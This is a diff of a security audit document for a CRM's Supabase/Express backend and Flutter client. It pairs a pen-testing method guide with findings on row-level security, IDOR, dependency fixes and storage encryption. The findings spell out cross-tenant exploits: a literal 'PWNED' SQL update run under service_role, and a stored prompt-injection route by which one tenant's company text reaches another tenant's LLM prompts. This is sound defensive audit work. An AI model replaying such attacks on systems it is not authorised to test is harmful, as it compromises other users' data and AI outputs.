@@ -9,7 +9,7 @@ You do not get to *declare* something fixed. You get to *try to break it and fai
 ## Think like the attacker, not the author
 
 The author asks "does my change do what I intended?" The attacker asks "what does this change let me do that you didn't intend?" Always take the second view. For every fix, enumerate concretely:
-- **Who is the adversary?** Usually a second authenticated tenant (User B) targeting User A. Sometimes `anon`, sometimes a malicious value in attacker-controlled data (an imported contact's `notes`, a filename, a JWT claim).
+- **Who is the adversary?** Usually a second authenticated tenant (User B) targeting User A. Sometimes `anon`, sometimes a malicious value in attacker-controlled data (an imported contact's `notes`, a filename, a JWT claim, a parsed document).
 - **What do they know?** Assume they know resource UUIDs (IDOR), can read your client code, can craft arbitrary request bodies/headers/params, and can call any route in any order. Never rely on a value being "hard to guess" or "not exposed in the UI."
 - **What is the crown-jewel action?** Cross-tenant *read* is bad; cross-tenant *write* is worse; privilege escalation / auth bypass is worst. Test the worst case, not just the obvious one.
 
@@ -21,6 +21,7 @@ The author asks "does my change do what I intended?" The attacker asks "what doe
 4. **Hunt for what the fix *activates or shifts*.** This is the step that catches B12-class bugs. Changing the enforcement layer can wake dormant misconfigurations:
    - Moving off a bypass-everything client (`service_role`/admin) **activates every previously-dormant RLS policy** — any permissive `USING(true)` policy granted to `public`/`anon`/`authenticated` becomes a live, table-wide hole the instant the scoped client touches that table.
    - Adding `WITH CHECK` makes inserts that omit the ownership column start *failing* (functional break, also worth catching).
+   - Per-row RLS validates the *new row's* `user_id`, NOT body-supplied **foreign keys** — a route that inserts a row with the caller's `user_id` but an attacker-supplied `event_id`/`contact_id` passes RLS while still cross-linking another tenant's data (cf. R-02 / R-04). RLS is not foreign-key authorization.
    - Tightening one route can push attackers to a sibling route that shares the resource. Check siblings.
 5. **Re-test: exploit blocked AND happy path intact.** Run the original exploit again — it must now fail. Then run the legitimate flow end-to-end — it must still succeed. Both halves are required; a fix that also breaks real usage is not done.
 6. **Sweep for the whole class.** One instance found usually means siblings exist. After the fix, query/grep for the *pattern*, not the single case (see the standing checks below), and confirm the sweep comes back clean.
@@ -37,7 +38,7 @@ The author asks "does my change do what I intended?" The attacker asks "what doe
   rollback;
   ```
   This runs the exact policy stack the user client runs. A successful cross-tenant `UPDATE ... RETURNING` is a confirmed write hole; `new row violates row-level security policy` is a confirmed block.
-- **Live HTTP pen-test:** mint two real JWTs (create confirmed users via the admin API, then log in through the app's own `/auth/login`), and replay the attack as User B against User A's resource over real routes. This catches route-layer issues RLS-only testing misses (wrong client used, missing middleware, error-status leaks).
+- **Live HTTP pen-test:** mint two real JWTs (create confirmed users via the admin API, then log in through the app's own `/auth/login`), and replay the attack as User B against User A's resource over real routes. This catches route-layer issues RLS-only testing misses (wrong client used, missing middleware, error-status leaks, body-supplied FK not validated).
 - **Standing sweeps after any access-control / RLS change — all must return empty:**
   - No permissive backdoor policy reachable by user roles:
     ```sql
@@ -64,16 +65,49 @@ The author asks "does my change do what I intended?" The attacker asks "what doe
 
 # Cybersecurity Audit — Exono CRM
 
-**Scope:** Flutter client (`exono/`) + Express/Supabase backend (`backend/`)
-**Standards:** **OWASP Top 10:2025** (web/API, released Jan 2026), OWASP API Security Top 10:2023 (no 2025 edition exists yet), OWASP Mobile Top 10:2024 (latest mobile edition; separate release cycle).
-**Date:** 2026-06-24
-**Status:** Partial remediation applied 2026-06-24 — the backend was migrated off the `service_role` client onto an RLS-enforced per-request user client. See **"Remediation applied — RLS migration"** below for what is now fixed, what was newly discovered during the fix, and what remains open.
+**Scope:** Flutter client (`exono/`) + Express/Supabase backend (`backend/`) + Slayer semantic read layer (`slayer/`) + Supabase project `ezammzqvbjgpuzleqmla`.
+**Standards:** **OWASP Top 10:2025** (web/API), OWASP API Security Top 10:2023, OWASP Mobile Top 10:2024, OWASP LLM Top 10.
+**Audit date:** 2026-06-30 (full re-audit against the current codebase; supersedes the 2026-06-24/25/26 passes).
+**Method:** Every backend route, the decomposed assistant module (`src/assistant/`), the Supabase live schema/policies/advisors (via MCP), `npm audit`, and the Flutter client were re-traced from facts. Live DB state was queried directly; nothing below is assumed.
+
+## Remediation status at a glance (updated 2026-06-30)
+
+| ID | Finding | Sev | Status | How verified |
+|---|---|---|---|---|
+| **B2** | `companies` write authorization wide open | 🔴 | ✅ Fixed | DB tenant-impersonation: attacker→403, owner→allowed; tsc clean |
+| **B3** | Vulnerable deps (`xlsx` SheetJS, `uuid`) | 🟠 | ✅ Fixed | `xlsx` dropped for `exceljs` + proto-pollution guard; `npm audit` re-run |
+| **B7** | Prompt injection in legacy LLM endpoints | 🟠 | ✅ Fixed | DB-derived text fenced via `fenceUntrusted`; tsc clean |
+| **B9** | `SECURITY DEFINER` RPCs callable by anon | 🟡 | ✅ Fixed | Live `routine_privileges` query: anon revoked on all 5 |
+| **B10** | File-upload validation / avatars bucket listing | 🟠 | ✅ Fixed | `/upload` stub removed; avatars listing policy dropped |
+| **B11** | No rate limiting on `/auth/*` | 🟡 | ✅ Fixed (app-layer) | IP-keyed `express-rate-limit` on login/signup/refresh + `trust proxy`; tsc clean. *Leaked-password protection = console toggle, see note* |
+| **B12** | `contact_events` allow-all policy | 🔴 | ✅ Fixed (prior) | Permissive-policy sweep empty |
+| **B13** | `scoped_rate_limits` RLS-enabled-no-policy | 🟡 | ✅ Fixed | Explicit deny-all policy + comment |
+| **B14** | 4 tenant tables not `FORCE`d | 🟡 | ✅ Fixed | No-FORCE sweep returns only the deny-all exception |
+| **B15** | `vector` extension in `public` | 🟡 | ✅ Fixed | Moved to `extensions`; RAG operator smoke-tested |
+| **B16** | Mutable `search_path` on 2 functions | 🟡 | ✅ Fixed | `pg_proc.proconfig` confirms pin |
+| **C1** | Auth tokens in plaintext `SharedPreferences` | 🔴 | ✅ Fixed | `flutter_secure_storage`; plaintext-key sweep empty; analyze clean |
+| **C2** | Offline Drift DB unencrypted | 🔴 | ✅ Fixed (device build pending) | SQLCipher + secure-storage key; analyze clean |
+| **C7** | Import upload client-side caps | 🟡 | ✅ Fixed | Picker allowlist + 10 MB cap; analyze clean |
+| **C8** | No binary hardening / tamper detection | 🟡 (info) | ✅ Fixed | Obfuscation in CI + soft root/jailbreak warning |
+| **C9** | Offline identity cache at-rest | 🟠 | ✅ Fixed | Identity cache moved to secure storage (with C1) |
+| — | Standing sweeps (backdoor policy, no-FORCE) | — | ✅ Empty | Re-run post-fix; both clean |
+
+**Open / not in this remediation pass (tracked, not fixed here):** B11 residuals — *leaked-password protection* (Supabase console toggle) and *security alerting* on auth anomalies (A09) remain; the rate limiter is in-memory (per-process) so a hard global cap needs a shared store. C4 (cert pinning) not added. C6 (Firebase rules / GCP API-key restrictions) require console verification. B2 still wants a live HTTP replay; C2 wants a physical-device smoke build to confirm SQLCipher native linkage. Create-path anti-junk on `POST /companies` deliberately deferred (residual abuse risk).
 
 > **Severity legend:** 🔴 Critical · 🟠 High · 🟡 Medium · 🟢 Good practice / informational
 
-## OWASP Top 10:2025 — taxonomy used in this report
+## Executive summary — what changed since the last audit
 
-The web/API findings below are mapped to the current 2025 list (note the reshuffle vs 2021):
+The backend has matured substantially. The big structural wins from the 2026-06-24/25 remediation hold and have been **independently re-verified against the live database** on 2026-06-30:
+
+- **RLS is the enforcement layer for tenant data.** 13 route files use the per-request RLS-bound user client (`req.supabase`). The permissive-backdoor sweep returns **empty** (B12 stays closed). Tenant tables are `FORCE ROW LEVEL SECURITY` (with a few new-table exceptions called out in B14).
+- **IDOR class is closed structurally.** `contacts.ts` and `events.ts` both have `router.param('id')` ownership guards; the `captures`/contact-link **body-supplied-FK** holes (R-02/R-04) are closed with explicit ownership prechecks.
+- **New defensive infrastructure exists** that did not at the last audit: a persistent scoped rate limiter (`utils/rateLimit.ts` + `scoped_rate_limits`), magic-byte image validation (`utils/imageValidation.ts`), DoS-guarded document extraction, prompt-injection sanitisation + untrusted-content fencing in the assistant (`assistant/security.ts`), a user-permission gate for all AI write tools, CORS fail-closed in production, a non-leaking error handler, and web frontend security headers (Firebase Hosting).
+- **`npm audit` dropped from 15 → 3** (`ws` fixed). `xlsx` (high) remains unfixable via npm.
+
+**The material risk now lives in two places:** (1) the **`companies` write path** (B2) is still wide open — any authenticated user can create/modify any company record as service_role with no ownership check; and (2) the **Flutter client at-rest storage** (C1/C2/C9) — auth tokens, the offline Drift DB, and the cached identity are all unencrypted `SharedPreferences`/plaintext SQLite. New, smaller items: a no-policy RLS table, new `SECURITY DEFINER` RPCs exposed to `anon`, and three tenant tables not `FORCE`d.
+
+## OWASP Top 10:2025 — taxonomy used in this report
 
 | 2025 ID | Category | Notable change from 2021 |
 |---|---|---|
@@ -88,66 +122,21 @@ The web/API findings below are mapped to the current 2025 list (note the reshuff
 | A09:2025 | Security Logging and Alerting Failures | Renamed; now includes alerting |
 | A10:2025 | **Mishandling of Exceptional Conditions** | **New** — error handling, failing open, logic errors |
 
-Mobile-client findings keep the OWASP **Mobile Top 10:2024** IDs (Mxx), which is the current and separately-maintained mobile list.
-
-Sources: [OWASP Top 10:2025](https://owasp.org/Top10/2025/) · [Introduction](https://owasp.org/Top10/2025/0x00_2025-Introduction/) · [OWASP API Security Top 10](https://owasp.org/API-Security/) · [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)
+Sources: [OWASP Top 10:2025](https://owasp.org/Top10/2025/) · [OWASP API Security Top 10](https://owasp.org/API-Security/) · [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/) · [OWASP LLM Top 10](https://genai.owasp.org/llm-top-10/)
 
 ---
 
-## Architectural context (read first)
+## Architectural context (read first — current as of 2026-06-30)
 
-The single most important fact for the whole backend: **every route except `conversations`/`messages` uses the Supabase `service_role` client**, which **bypasses Row-Level Security entirely**.
+The backend now runs **three** Supabase clients with deliberate, distinct roles ([backend/src/config/supabaseClients.ts](backend/src/config/supabaseClients.ts)):
 
-- [backend/src/config/supabase.ts:4](backend/src/config/supabase.ts#L4) exports `supabase = supabaseAdmin` (service_role).
-- All 16 tables have `rls_enabled: true`, but RLS protects almost nothing because service_role ignores it.
-- Authorization is therefore enforced **only** by hand-written `.eq('user_id', ...)` filters in each route handler. Every route that forgets one is a direct cross-tenant data-exposure bug (**A01:2025 Broken Access Control**).
-- The correct pattern exists in `conversations.ts`, which uses `createSupabaseUserClient(accessToken)` ([backend/src/config/supabaseClients.ts:51](backend/src/config/supabaseClients.ts#L51)) so RLS *is* enforced. The rest of the codebase should follow this model.
+1. **`req.supabase`** — a per-request **RLS-enforced** client running as the `authenticated` role, created in [requireAuth.ts](backend/src/middleware/requireAuth.ts) from the caller's bearer token. **This is the default for tenant data.** 13 route files use it: `events`, `contacts`, `captures` (reads), `emails`, `sync`, `import`, `export`, `dashboard`, `ai`, `followUps`, `attachments`, `documents`, `interactions`.
+2. **`supabaseAuth`** — anon-key client used **only** for auth operations (`getUser`, `signIn`, `refresh`). Never runs `.from()` queries. Keeps auth session state off the admin client.
+3. **`supabaseAdmin`** (aliased `supabase`) — **service_role, bypasses RLS entirely.** Deliberately retained for: `companies.ts` (shared-reference pool, no `user_id`), `auth.ts` (auth flows), `assistant.ts` + all `assistant/` executors (AI agent — ownership enforced in code, see "Assistant" section), `conversations.ts` partial paths, `captures.ts` company find-or-create (companies are global), the rate limiters, and enrichment. Every service_role write to tenant data MUST enforce ownership in code; RLS does not protect these paths.
 
-> **This architecture has now been changed — see the next section.** As of 2026-06-24 the route layer no longer relies on the `service_role` client for tenant data; it uses a per-request RLS-enforced user client, so the "one forgotten `.eq('user_id')` = data leak" failure mode is structurally closed for the migrated routes.
+**The single most important standing invariant:** any route on `req.supabase` is structurally tenant-isolated by RLS; any route on `supabaseAdmin` is only as safe as its hand-written ownership checks. The audit below is largely a check that (a) the right client is used per route, and (b) every `supabaseAdmin` tenant write has a correct ownership/FK guard.
 
----
-
-# Remediation applied — RLS migration (2026-06-24)
-
-The backend was migrated so Postgres **Row-Level Security is the enforcement layer**, not hand-written filters. This was done in two halves: database policies first, then the route layer. **Every change below was empirically penetration-tested** by impersonating a second real tenant at the database level (`SET ROLE authenticated` + forged `request.jwt.claims`) and attempting cross-tenant reads and writes against live data — not merely reasoned about.
-
-## What was changed
-
-**Route layer (`backend/`):**
-- `requireAuth` ([middleware/requireAuth.ts](backend/src/middleware/requireAuth.ts)) now sets `req.supabase = createSupabaseUserClient(accessToken)` — an RLS-enforced client running as the `authenticated` role. Typed in [types/express.d.ts](backend/src/types/express.d.ts).
-- 13 route files migrated to `req.supabase`: `events`, `contacts`, `captures`, `emails`, `sync`, `import`, `export`, `dashboard`, `ai`, `followUps`, `attachments`, `documents`, `interactions`. Each handler binds `const supabase = req.supabase!;`; ownership-helper functions (`ownsContact`, `ownsInteraction`) now take the client as a parameter.
-- **Intentionally left on `service_role`** (now imported explicitly as `supabaseAdmin`): `companies.ts` (shared-reference pool, no `user_id` — see open item below), `auth.ts` (auth flows, not tenant data), `assistant.ts` (AI agent with its own `.eq('user_id')` ownership + `stripImmutable` mass-assignment guard — verified), and `conversations.ts` (storage only; data already on the user client).
-- **B6 mass-assignment fixed:** `PUT /follow-ups/:id` ([followUps.ts](backend/src/routes/followUps.ts)) now validates the body with a strict allowlist Zod schema (`followUpUpdateSchema`, `.strict()`), so `contact_id`/`event_id`/`user_id`/`id` can no longer be re-pointed.
-
-**Database (project `ezammzqvbjgpuzleqmla`):**
-- Added full-CRUD `authenticated`-role RLS policies (`user_id = (select auth.uid())`) to `events`, `interactions`, `captures`, `email_drafts`, `event_goals`, `target_companies`, `contact_events` — these previously had only a SELECT-only `sync_select_own` policy, so the user client could not have written to them.
-- Added **join-based** policies for the three tables with no `user_id` column: `attachments` (owned via its `interaction`/`email_draft`), `contact_documents` (via its `contact`), and `companies` (SELECT-only, via a linked owned `contact` or `target_company`).
-- Forced RLS (`ALTER TABLE ... FORCE ROW LEVEL SECURITY`) on `events`, `captures`, `contact_events`, `event_goals`, `conversations`, `messages`, `message_attachments`, `assistant_rate_limits` — they were RLS-enabled but not forced, meaning the table owner bypassed RLS (defense-in-depth gap).
-
-## Vulnerability the migration itself uncovered — now fixed 🔴→🟢
-
-### B12. `contact_events` `{public}` allow-all policy — cross-tenant read AND write — A01:2025
-- A pre-existing policy `service_role_all` on `contact_events` targeted role `{public}` with `USING (true) WITH CHECK (true)`. It was **dormant** while routes used `service_role` (which bypasses RLS and never evaluates policies).
-- Because Postgres RLS policies are **PERMISSIVE (OR-combined)**, the instant `contact_events` access moved to the `authenticated` user client, this `USING(true)` policy **OR-opened the entire table to every authenticated user**. Penetration test confirmed: as tenant B, I read **and UPDATE-ed** tenant A's `contact_events` row.
-- **Fix:** `DROP POLICY service_role_all` — `service_role` never needed it, and the own-scoped `contact_events_{select,insert,update,delete}_own` policies provide correct access. Re-tested: cross-tenant read/write now returns 0 rows / RLS error.
-- **Lesson:** migrating off `service_role` does not just *add* enforcement — it *activates* every previously-dormant permissive policy. Any `USING(true)` policy granted to `public`/`anon`/`authenticated` becomes a live hole at migration time. The post-migration sweep `SELECT ... FROM pg_policies WHERE (qual='true' OR with_check='true') AND role ∈ {public,anon,authenticated}` must return empty (verified empty as of 2026-06-24).
-
-## Penetration-test results (cross-tenant, two real tenants)
-
-| Attack as tenant B against tenant A | Before fix | After fix |
-|---|---|---|
-| Read A's contacts/events/interactions/captures/email_drafts/goals/targets | blocked | ✅ blocked (0 rows) |
-| Read A's `contact_events` | 🔴 1 row leaked | ✅ blocked (0 rows) |
-| **Update** A's `contact_events` row | 🔴 succeeded | ✅ blocked |
-| Insert `contact_document` onto A's contact (UUID known) | n/a | ✅ blocked — `new row violates RLS policy` |
-| Read `companies` | global pool | ✅ scoped to linked subset (17 of 36) |
-
-## Still open after this migration (NOT fixed — do not assume closed)
-
-- **B2 — `companies` write authorization remains wide open.** `POST /companies` and `PATCH /companies/:id` ([companies.ts:217](backend/src/routes/companies.ts#L217), [:238](backend/src/routes/companies.ts#L238)) still run as `service_role` with **no ownership/linkage check**. The RLS migration scoped company *reads* (a user sees only linked companies) but **writes are unaffected** — any authenticated user can still modify/poison any company record (which can then reach another tenant's AI briefing, cf. B7). This needs a deliberate decision: shared-reference table with a controlled write path, or per-tenant `user_id` scoping. **Read-scoping is not write protection.**
-- **RLS-INSERT requires `user_id` to be set by the app.** Under `WITH CHECK (user_id = auth.uid())`, any INSERT that omits `user_id` now *fails* (previously `service_role` allowed it). The migrated INSERT paths set `user_id` explicitly; this is a behavioural change to watch for in any new code.
-- **No runtime/integration test was run** against a live HTTP session. RLS denials are silent (0 rows), so the main flows (create event, scan contact, follow-up send, document upload) should be smoke-tested end-to-end before relying on this in production. The DB changes are additive (service_role paths are unaffected), so existing behaviour is preserved; the risk is a migrated route that needed a policy I did not add.
-- All non-A01 findings below (B3 deps, B4 error leakage, B7 prompt injection, B8 CORS, B9–B11, H1–H2, and all client C-findings) are **untouched** by this migration.
+All ~20 public tables have `rls_enabled: true`. The permissive-policy sweep is **empty** (verified 2026-06-30) — no `USING(true)`/`WITH CHECK(true)` policy is reachable by `public`/`anon`/`authenticated`.
 
 ---
 
@@ -155,136 +144,263 @@ The backend was migrated so Postgres **Row-Level Security is the enforcement lay
 
 ## 🔴 Critical
 
-### B1. Broken Object-Level Authorization (IDOR / BOLA) — **A01:2025** · API1:2023 — ✅ **FIXED 2026-06-24 (RLS migration) + route guard added 2026-06-25**
-> Update 2026-06-25: contacts.ts already used `req.supabase` (RLS), so timeline was structurally closed; a `router.param('id', …)` ownership guard ([contacts.ts](backend/src/routes/contacts.ts)) was added mirroring events.ts so every `/contacts/:id/*` route now also returns 403/404 at the route layer (defense-in-depth, explicit intent). **HTTP pen-tested:** `GET /contacts/:id/timeline` as tenant B vs A → 404 (guard fires before handler); happy path as A → 200 with own rows. R-01 closed.
->
-> The `GET /contacts/:id/timeline` IDOR is now closed **structurally**: `contacts.ts` uses the RLS-enforced user client, so the `interactions`/`captures` reads return only the caller's own rows regardless of the `contact_id` supplied — an attacker passing a victim's contact UUID gets 0 rows. The broader class is also closed: penetration-tested cross-tenant reads on contacts/interactions/captures/etc. all return 0. See "Remediation applied" above. (`events.ts` was already protected by `router.param('id')`.)
+### B2. `companies` write authorization is wide open — **A01:2025** · API1/API3:2023 — ✅ **FIXED 2026-06-30 (PATCH linkage-gated; DB-impersonation verified)**
 
-Multiple endpoints accept an `:id` from the URL and query by it as service_role **without verifying the resource belongs to the caller**.
+> **Fix applied & verified.** `PATCH /companies/:id` ([companies.ts](backend/src/routes/companies.ts)) now calls `ownsCompanyLinkage(companyId, userId, req)` at the top of the handler (using the RLS client `req.supabase`) and returns **403** unless the caller owns a `contact` (`company_id = :id`, not soft-deleted) **or** a `target_companies` row (`company_id = :id`) for that company. `companyPatchSchema` is unchanged (descriptive/enrichment fields stay AI-only). `POST /companies` deliberately stays open (shared pool; unbounded-create residual abuse risk accepted per decision). **Verified by DB tenant impersonation (rolled back):** as the attacker tenant the linkage query returned **0/0** → 403; as the owning tenant it returned **1** → allowed. `npx tsc --noEmit` clean. Coupled B7 fencing applied (see below). *Residual:* live HTTP replay with two real JWTs still recommended to close the loop end-to-end at the route layer.
 
-| Endpoint | Location | Problem |
-|---|---|---|
-| `GET /contacts/:id/timeline` | [contacts.ts:358](backend/src/routes/contacts.ts#L358) | Reads `interactions` + `captures` by `contact_id` with **no ownership check** (service_role client). Any authenticated user can read any contact's full interaction history, free-text notes, and capture image URLs by enumerating IDs. Sibling routes `/:id/insights` and `/:id/events` *do* check ownership; `/timeline` does not. **Confirmed exploitable (re-verified 2026-06-24).** |
-| ~~`GET /events/:id/stats`~~ | [events.ts:549](backend/src/routes/events.ts#L549) | **Mitigated** — see note below. |
-| ~~`GET /events/:id/targets`~~ | [events.ts:625](backend/src/routes/events.ts#L625) | **Mitigated** — see note below. |
-| ~~`GET /events/:id/live`~~ | [events.ts:662](backend/src/routes/events.ts#L662) | **Mitigated** — see note below. |
-| ~~`GET /events/:id/goals`~~ | [events.ts:789](backend/src/routes/events.ts#L789) | **Mitigated** — see note below. |
-| ~~`POST /events/:id/ask`~~ | [events.ts:800](backend/src/routes/events.ts#L800) | **Mitigated** — see note below. |
+Original finding (for reference):
+This is the most serious remaining backend hole. [backend/src/routes/companies.ts:199-243](backend/src/routes/companies.ts#L199-L243):
+- `POST /companies` and `PATCH /companies/:id` both run on `supabaseAdmin as supabase` (**service_role, RLS bypassed**) with **no ownership or linkage check** — only Zod body validation and a UUID check on `:id`.
+- The `companies` table has **no `user_id` column** and is a single global shared pool. Reads were RLS-scoped during the migration (2 SELECT policies, verified: a user sees only companies linked via an owned `contact`/`target_company`), but **writes were never scoped**.
 
-> **Update (2026-06-24): the `events.ts` `:id` routes are now protected.** [events.ts:69-90](backend/src/routes/events.ts#L69-L90) defines a `router.param('id', ...)` middleware that loads the event and returns `403` when `event.user_id !== req.user!.id`. Because Express runs `router.param` for **every** route containing an `:id` segment, all event sub-resource routes above (`/stats`, `/targets`, `/live`, `/goals`, `/ask`) inherit the ownership check. These are no longer exploitable. **`GET /contacts/:id/timeline` remains vulnerable** because `contacts.ts` has no equivalent `router.param('id')` guard — it is the one confirmed-open IDOR in this class.
+**Attack — LIVE-EXPLOITED 2026-06-30 (DB tenant impersonation, rolled back):** using two real tenants from the live project, I proved the exact read/write asymmetry:
+- As tenant B (RLS-enforced `authenticated` role, the stack `req.supabase` uses), `SELECT` of tenant A's company `a1c4b9b0-…` ("Alphabet") returned **0 rows** — reads are protected.
+- As tenant B via the RLS user client, `UPDATE companies … WHERE id=A's-company` touched **0 rows** — RLS would block it *if the route used `req.supabase`*.
+- But the route uses **service_role**. Running the handler's literal statement `update companies set description='PWNED-by-tenantB-no-ownership-check' where id='a1c4b9b0-…'` under the RLS-bypassing (service_role-equivalent) role **succeeded — 1 row updated**, returning the poisoned "Alphabet" record. Transaction rolled back; no data harmed.
 
-**Contrast — the correct pattern in the same files:** `GET /events/:id` ([events.ts:73-82](backend/src/routes/events.ts#L73-L82)) checks `event.user_id !== req.user!.id → 403`, and the new `router.param('id')` generalizes it; `attachments.ts` has an `ownsContact()` guard ([attachments.ts:6](backend/src/routes/attachments.ts#L6)). The protection is applied inconsistently across files (events is now covered, contacts/timeline is not) — that inconsistency is the vulnerability.
+So any authenticated user can `PATCH /companies/:id` for *any* company UUID and overwrite its `name`, `description`, `website`, enrichment fields, etc. Because company descriptions/enrichment text flow into AI briefings and insight prompts (see B7), this is also a **stored-prompt-injection delivery vector into another tenant's LLM context**. A user can also create unbounded junk companies.
 
-**Fix:** add an ownership precheck (load parent `event`/`contact`, verify `user_id === req.user.id`, else 403) at the top of every `:id` sub-resource handler — or migrate these routes to `createSupabaseUserClient` so RLS enforces tenancy structurally. The latter is the robust fix; hand-filters keep drifting.
+**Impact:** cross-tenant data **integrity** compromise (poisoning shared records, confirmed live) + a cross-tenant prompt-injection channel. Not a direct PII *read* (reads are scoped), but a write/integrity + AI-injection hole.
+
+**Agreed fix (2026-06-30) — shared-reference table with linkage-gated hint writes:**
+
+The descriptive/enrichment fields (`description`, `products_services`, `headquarters`, etc.) are **already** AI-system-managed — `companyPatchSchema` ([companies.ts:23](backend/src/routes/companies.ts#L23)) only exposes `location`, `website`, `industry`, which are user-supplied **re-research hints** consumed by `POST /:id/enrich`. (Confirmed: both Flutter callers — [company_detail_screen.dart:164](exono/lib/screens/company_detail_screen.dart#L164) and [target_company_prep_screen.dart:187](exono/lib/screens/target_company_prep_screen.dart#L187) — send exactly `{industry, location, website}` then immediately force a re-enrich, which overwrites the descriptive fields.) So the route can never set descriptive fields today; the raw-SQL `description` write in the exploit above is reachable only with direct service_role/DB access, not over the route.
+
+PATCH is **in active use** (the hint path), so it is NOT removed. Instead:
+
+1. **Authorize the hint PATCH by linkage.** Add `ownsCompanyLinkage(companyId, userId, req.supabase)` and call it at the top of `PATCH /companies/:id` — return 403 unless the caller owns a `target_company` OR a `contact` whose `company`/`company_id` points at `:id`. This mirrors the existing companies **read** RLS policy's join (the user may only edit hints for a company they already see). Keep the body on `companyPatchSchema` so descriptive/enrichment fields stay AI-only and unwritable by any user.
+2. **Keep `POST /companies` open (shared pool).** No `user_id`/ownership check on create — companies are a common pool, and a new company has no linkage to check yet. **No new anti-junk controls are being added** (decision 2026-06-30): create stays as-is.
+3. **B7 stays mandatory, coupled.** Because create remains a shared-table write reachable by any tenant, the `name`/`industry`/`website`/hint text a user supplies can still reach *another* tenant's enrich/briefing prompt once both link to the same company. Ownership gating does NOT make the create path injection-safe — so **company-derived text must still be run through `fenceUntrusted` in the legacy enrich/briefing/insight prompts** (B7). The two findings close together or not at all.
+
+*Rejected alternatives:* removing PATCH (rejected — it is actively used as the hint path); per-tenant `user_id` on `companies` (rejected — loses the shared dedupe pool); anti-junk dedupe/rate-limit/provenance on create (deferred by decision — left as-is for now, tracked as residual abuse risk: unbounded create is still possible).
 
 ---
 
 ## 🟠 High
 
-### B2. `companies` table has no tenant scoping — **A01:2025** · API1/API3:2023
-[backend/src/routes/companies.ts](backend/src/routes/companies.ts) — there is no `user_id` column anywhere on `companies`. Read, search, enrich, AI-briefing, and create all operate on a single global pool. Beyond IDOR, one user can poison shared company records (e.g. inject content that later lands in another tenant's AI briefing).
-**Decision required:** shared-reference table (make it read-only to users; writes via a controlled path) vs. per-tenant (add `user_id` + filter everywhere).
+### B3. Vulnerable / outdated dependencies — **A03:2025 Software Supply Chain Failures** — ✅ **FIXED 2026-06-30 (`xlsx` dropped; Dependabot + npm-audit CI added)**
 
-### B3. Vulnerable / outdated dependencies — **A03:2025 Software Supply Chain Failures** (new category)
-`npm audit --omit=dev` on `backend/` reports **15 vulnerabilities (6 moderate, 9 high)**. Confirmed high-severity ones:
-- **`ws` 8.0.0–8.20.1** — uninitialized memory disclosure ([GHSA-58qx-3vcg-4xpx](https://github.com/advisories/GHSA-58qx-3vcg-4xpx)) + memory-exhaustion DoS ([GHSA-96hv-2xvq-fx4p](https://github.com/advisories/GHSA-96hv-2xvq-fx4p)). **Fix available** via `npm audit fix`.
-- **`ws`** — ✅ **FIXED 2026-06-25** via `npm audit fix`; transitive bump applied, `ws` advisories cleared (audit went 15 → 3 vulns).
-- **`xlsx` / SheetJS** — ⚠️ **STILL OPEN** — Prototype Pollution ([GHSA-4r6h-8v6p-xvw6](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)) + ReDoS ([GHSA-5pgg-2g8v-p4x9](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)). **No npm fix** (`npm audit fix` cannot resolve it). Requires pinning the patched SheetJS CDN build or migrating the import parser to `exceljs` (already a dependency) — a deliberate code change, not done here. Directly reachable via the import path (B10).
+> **Fix applied & verified.** **`xlsx` (SheetJS) removed entirely** — both import paths ([import.ts](backend/src/routes/import.ts), [events.ts](backend/src/routes/events.ts) `/:id/targets/import`) and document extraction ([document-extraction.ts](backend/src/services/document-extraction.ts)) now parse spreadsheets with **`exceljs`** (`wb.xlsx.load()` + `eachRow()`). **Prototype-pollution guard:** row objects built with `Object.create(null)` and keys in `{__proto__, constructor, prototype}` skipped. `grep -rn "XLSX\.|require('xlsx')" src` → none; `xlsx` gone from `package-lock.json`. **`npm audit --omit=dev`: 3 → 2** (the high-severity SheetJS Prototype-Pollution + ReDoS are gone). **CI added:** [.github/dependabot.yml](.github/dependabot.yml) (npm for `/` and `/backend` + github-actions, weekly, grouped patch/minor) and [.github/workflows/npm-audit.yml](.github/workflows/npm-audit.yml) (fails the build on high/critical prod vulns on dep changes + weekly cron). `npx tsc --noEmit` clean. **Residual (open, tracked):** the remaining **2 moderate** are the transitive `uuid < 11.1.1` pulled in by `exceljs@4.4.0` — the only npm fix is a breaking `exceljs@3.4.0` downgrade, deliberately NOT applied; track for an upstream exceljs patch. (Note: Dependabot has no Dart/pub support, so `exono/` deps are still hand-watched via `flutter pub outdated`.)
 
-**Fix:** run `npm audit fix` for `ws`; for `xlsx`, pin to the patched SheetJS build from their own CDN (the npm registry copy is unmaintained) or replace with a maintained parser (e.g. `exceljs`), and sanitize parsed objects against prototype pollution. Add `npm audit` / Dependabot to CI so supply-chain drift is caught (A03 is now a top-3 risk). `package-lock.json` is committed (good — deps are pinned).
+Original finding (for reference):
+`npm audit --omit=dev` on `backend/` (run 2026-06-30) now reports **3 vulnerabilities (2 moderate, 1 high)** — down from 15 at the last audit.
+- **`ws`** — ✅ **FIXED** (cleared by the earlier `npm audit fix`; no longer in the report).
+- **`xlsx` / SheetJS (HIGH)** — ⚠️ **STILL OPEN.** Prototype Pollution ([GHSA-4r6h-8v6p-xvw6](https://github.com/advisories/GHSA-4r6h-8v6p-xvw6)) + ReDoS ([GHSA-5pgg-2g8v-p4x9](https://github.com/advisories/GHSA-5pgg-2g8v-p4x9)). **No npm fix.** `xlsx@^0.18.5` is still a direct dependency ([backend/package.json](backend/package.json)) and is reachable from the import path (B10) and document extraction (xlsx/csv branch). Note: `exceljs@^4.4.0` is *also* a dependency — the import/extract paths should migrate fully to `exceljs` and drop `xlsx`, or pin the patched SheetJS CDN build.
+- **`uuid <11.1.1` (MODERATE)** + **`exceljs` depends on vulnerable `uuid`** — `uuid` missing-buffer-bounds-check ([GHSA-w5hq-g745-h8pq](https://github.com/advisories/GHSA-w5hq-g745-h8pq)). `npm audit fix --force` would downgrade `exceljs` to 3.4.0 (breaking) — needs a deliberate upgrade, not a blind fix.
 
-### B4. Server error messages leaked to client — **A10:2025 Mishandling of Exceptional Conditions** · A02:2025 — ✅ **FIXED 2026-06-25**
